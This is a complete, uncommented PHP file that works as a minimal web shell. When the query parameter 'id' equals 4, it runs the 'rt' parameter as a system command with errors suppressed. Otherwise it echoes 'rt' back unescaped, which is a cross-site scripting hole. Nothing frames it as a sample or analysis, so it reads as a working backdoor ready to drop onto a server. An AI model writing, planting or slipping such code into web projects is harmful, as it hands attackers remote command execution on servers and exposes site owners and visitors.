<?
$id = $_GET['id'];
$rt = $_GET['rt'];

if ( $id == 4 ){
  @system( $rt );
}
else
{
  echo $rt;
}
?>
